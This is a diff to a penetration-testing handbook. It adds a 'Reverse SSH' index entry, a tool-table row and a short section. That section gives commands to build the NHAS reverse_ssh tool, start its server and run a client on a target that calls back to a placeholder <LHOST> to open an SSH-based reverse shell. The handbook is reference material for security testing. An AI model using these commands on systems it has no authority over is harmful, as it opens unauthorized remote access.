@@ -82,6 +82,7 @@
 - [readpst](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#readpst)
 - [regedit](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#regedit)
 - [rev](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#rev)
+- [Reverse SSH](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#Reverse-SSH)
 - [rlwrap](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#rlwrap)
 - [rpm2cpio](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#rpm2cpio)
 - [rsh](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/basics.md#rsh)
@@ -137,6 +138,7 @@
 | CyberChef | The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis. | https://gchq.github.io/CyberChef |
 | MailHog | Web and API based SMTP testing | https://github.com/mailhog/MailHog |
 | Modlishka | Modlishka. Reverse Proxy. | https://github.com/drk1wi/Modlishka |
+| Reverse SSH | SSH based reverse shell | https://github.com/NHAS/reverse_ssh |
 | searchcode | Search 75 billion lines of code from 40 million projects | https://searchcode.com |
 | socat | Mirror of the socat source code with pre-built releases for Linux (x64 and x86), Windows (x64 and x86), and MacOS (x64) | https://github.com/3ndG4me/socat |
 | Swaks | Swiss Army Knife for SMTP | https://github.com/jetmore/swaks |
@@ -4500,7 +4502,30 @@ C:\> reg.exe save hklm\system c:\temp\system.save
 ## rev
 
 ```c
-echo "foobar" | rev
+$ echo "foobar" | rev
+```
+
+## Reverse SSH
+
+```c
+$ git clone https://github.com/NHAS/reverse_ssh
+$ cd reverse_ssh
+$ make
+$ cd bin/
+$ cat ~/.ssh/id_rsa.pub > authorized_keys
+$ ./server 0.0.0.0:3232
+```
+
+```c
+./client -d <LHOST>:3232
+```
+
+```c
+$ ssh <LHOST> -p 3232 ls -t
+```
+
+```c
+$ ssh -J <LHOST>:3232 1fe03478b2775060f6643adaac57a0f5b99989b3
 ```
 
 ## rlwrap
